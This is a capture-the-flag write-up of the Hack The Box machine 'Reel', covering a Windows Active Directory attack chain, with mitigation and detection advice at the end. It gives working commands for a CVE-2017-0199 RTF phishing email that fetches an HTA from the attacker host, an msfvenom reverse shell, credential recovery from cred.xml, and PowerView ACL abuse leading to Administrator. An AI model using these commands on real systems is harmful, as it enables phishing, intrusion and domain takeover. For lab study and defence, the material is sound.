---
machine: Reel
os: Windows
difficulty: Hard
platform: Hack The Box
category: Windows / Active Directory
state: Retired
tags: [windows, active-directory, smtp, phishing, rtf, cve-2017-0199, acl, writedacl]
---

# Reel — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired according to HTB and public writeups; not verified with an HTB session.
> Method note: no flags or real credentials.

## TL;DR

Host `REEL.HTB.LOCAL` in the `HTB.LOCAL` domain. Anonymous FTP publishes internal documentation and a `readme.txt` asking for RTF procedures by email. An RTF exploiting **CVE-2017-0199** is sent to `nico@megabank.com`; it runs an HTA and returns a shell. `nico`'s desktop has a `cred.xml` with `tom`'s password; `tom` has `WriteOwner` over `claire`; `claire` has `WriteDacl` over `Backup_Admins`; the group reaches the backup script holding Administrator's password.

## Recon

```bash
nmap -p- -T4 -Pn -oA nmap_all <IP>
nmap -p21,22,25,135,139,445,593,49159 -sCV -Pn -oA nmap_svc <IP>
```

```text
21/tcp   ftp        Microsoft ftpd (anonymous)
22/tcp   ssh        OpenSSH 7.6
25/tcp   smtp       Microsoft ESMTP
135/tcp  msrpc
139/tcp  netbios-ssn
445/tcp  microsoft-ds
593/tcp  ncacn_http
```

Old and modern scans disagree on high RPC ports; the stable core is FTP, SSH, SMTP and SMB. The domain is `HTB.LOCAL`; the host advertises itself as `REEL`.

```bash
printf '%s\n' '<IP> reel.htb.local HTB.LOCAL REEL' | sudo tee -a /etc/hosts
```

## Enumeration

```bash
ftp -n <IP>
# anonymous / anonymous
ls
get readme.txt
get AppLocker.docx
get 'Windows Event Forwarding.docx'
```

Anonymous FTP serves three documents. `readme.txt` explains that the team accepts document-conversion procedures and asks for them by email at `nico@megabank.com`. It is a direct invitation to a vulnerable mail client.

```bash
swaks --to nico@megabank.com --from ryan@test.com \
  --server <IP> --header 'Subject: RTF conversion' \
  --attach click.rtf
```

## Foothold

### RTF + CVE-2017-0199

CVE-2017-0199 lets an RTF document load a remote object and run an HTA without Office's usual protection. Generate the HTA and the RTF:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 \
  -f hta-psh -o shell.hta
python2 cve-2017-0199_toolkit.py -M gen -t RTF \
  -w click.rtf -u http://<LHOST>/shell.hta -x 0
```

Serve `shell.hta` over HTTP, listen on 443 and send `click.rtf` over SMTP. When opened, `nico` runs the HTA and returns a shell as `HTB\nico`.

Metasploit variant: `exploit/windows/fileformat/office_word_hta` builds the document and `exploit/multi/handler` catches the session. The tool does not change the vector.

### From nico to tom

`nico`'s desktop has a `cred.xml` exported with `Export-Clixml`:

```powershell
$cred = Import-CliXml -Path C:\Users\nico\Desktop\cred.xml
$cred.GetNetworkCredential().Password
```

It returns `tom`'s password (`<PASS_TOM>`). Log in over SSH:

```bash
ssh tom@reel.htb.local
```

The user flag is in `tom`'s profile.

## Privilege escalation

### Tom → Claire: WriteOwner

`tom` has **WriteOwner** over `claire`. Take ownership, grant `ResetPassword` and set a new password:

```powershell
Import-Module .\PowerView.ps1
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
$pass = ConvertTo-SecureString '<PASS_CLAIRE>' -AsPlainText -Force
Set-DomainUserPassword -Identity claire -AccountPassword $pass
```

Now authenticate as `claire` over SSH or WinRM (if the relevant group allows it).

### Claire → Backup_Admins: WriteDacl

`claire` has **WriteDacl** over the `Backup_Admins` group. Grant `WriteMembers` and add Claire:

```powershell
Add-DomainObjectAcl -TargetIdentity 'Backup_Admins' \
  -PrincipalIdentity claire -Rights WriteMembers
Add-DomainGroupMember -Identity 'Backup_Admins' -Members claire
```

`net group backup_admins claire /add` is the non-PowerView variant in other writeups; the underlying right is the same.

### Backup_Admins → Administrator

The group can access Administrator's directory and the backup scripts. One script contains Administrator's password in clear text (`<PASS_ADMIN>`). Over SSH:

```bash
ssh administrator@reel.htb.local
```

```text
whoami
htb\administrator
```

The root flag has a deny entry for `Backup_Admins`; group membership alone cannot read it, so Administrator's account is required. That detail matters: the path ends in a backup credential, not in DCSync.

## Evidence

- `nmap` with FTP/SSH/SMTP/SMB.
- `readme.txt` and the anonymous FTP documents.
- Generated RTF and sent email, callback IP redacted.
- Shell as `HTB\nico` and `cred.xml` read with `Import-CliXml`.
- `tom`'s ACL over `claire` and `claire`'s over `Backup_Admins`.
- Backup script with Administrator's password, redacted.
- `whoami` as `htb\administrator`, no flags.

## Lessons learned

- Anonymous FTP does not just leak documents: it describes the business process and the phishing recipient.
- CVE-2017-0199 is a **remote object resolution** flaw, not a macro; the RTF is the vehicle.
- `cred.xml` is not protected by a machine key: `Import-CliXml` under the same account recovers the password.
- `WriteOwner` and `WriteDacl` are different rights: the first changes ownership and then permissions; the second rewrites the ACL directly.
- `Backup_Admins` cannot read the root flag because of an explicit deny; the goal is Administrator's credential.

## Mitigations and detection

- Block RTF attachments and remote objects in email; patch Office (CVE-2017-0199) and disable HTA execution from untrusted locations.
- Restrict anonymous FTP and do not publish internal procedures with recipients and workflows.
- Audit ACLs: `WriteOwner`/`WriteDacl` over users and groups are escalation privileges; review with BloodHound.
- Do not store credentials in `cred.xml` or passwords in backup scripts; use gMSA or a secret manager.
- Detection: 5136 on `nTSecurityDescriptor`; unexpected 4728/4732/4756; 4662 with `WriteDACL`; RTF/HTA email; `mshta.exe` launched from a user file.
- MITRE: T1566.001, T1203, T1552.001, T1222.001, T1098, T1078.002.

## References

- <https://0xdf.gitlab.io/2018/11/10/htb-reel.html>
- <https://axcheron.github.io/writeups/htb/reel>
- <https://www.hackthebox.com/machines/reel>
